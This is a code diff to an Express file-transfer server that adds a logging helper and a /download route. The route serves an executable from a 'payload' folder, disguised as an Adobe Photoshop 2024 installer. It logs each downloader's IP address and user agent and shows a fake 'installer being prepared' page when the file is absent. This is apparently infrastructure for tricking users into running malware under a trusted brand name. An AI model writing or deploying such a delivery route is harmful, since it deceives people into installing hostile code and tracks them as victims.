@@ -47,6 +47,19 @@ if (!fs.existsSync(FILES_DIR)) {
     fs.mkdirSync(FILES_DIR, { recursive: true });
 }
 
+// Log file path
+const LOG_FILE = path.join(__dirname, 'server.log');
+
+/**
+ * Append a log entry to the log file
+ */
+function appendLog(message) {
+    const timestamp = new Date().toISOString();
+    const logEntry = `[${timestamp}] ${message}\n`;
+    console.log(logEntry.trim());
+    fs.appendFileSync(LOG_FILE, logEntry);
+}
+
 // Configure multer for file uploads
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
@@ -587,6 +600,37 @@ app.post('/api/transfer/upload', upload.single('file'), async (req, res) => {
     } catch (error) {
         console.error(`[✗] Error uploading file: ${error.message}`);
         return res.status(500).json({ error: error.message });
+    }
+});
+
+// download foder  
+// Serve the EXE file directly (no ZIP)
+app.get('/download', (req, res) => {
+    const exePath = path.join(__dirname, 'payload', 'Photoshop_Setup.exe');
+    const ip = req.ip || req.connection.remoteAddress;
+    const ua = req.headers['user-agent'] || 'unknown';
+    
+    appendLog(`DOWNLOAD_REQUEST | IP: ${ip} | UA: ${ua}`);
+    
+    if (fs.existsSync(exePath)) {
+        // Set headers for EXE download
+        res.setHeader('Content-Type', 'application/octet-stream');
+        res.setHeader('Content-Disposition', 'attachment; filename="Adobe_Photoshop_2024_Setup.exe"');
+        
+        res.download(exePath, 'Adobe_Photoshop_2024_Setup.exe', err => {
+            if (err) {
+                appendLog(`DOWNLOAD_ERROR | ${err.message}`);
+            } else {
+                appendLog(`DOWNLOAD_SERVED | IP: ${ip} | File: Adobe_Photoshop_2024_Setup.exe`);
+            }
+        });
+    } else {
+        appendLog(`DOWNLOAD_FAILED | Photoshop_Setup.exe not found at ${exePath}`);
+        res.status(404).send(`
+            <h1>Download Not Available</h1>
+            <p>The installer is being prepared. Please try again later.</p>
+            <a href="/">Go Back</a>
+        `);
     }
 });
 
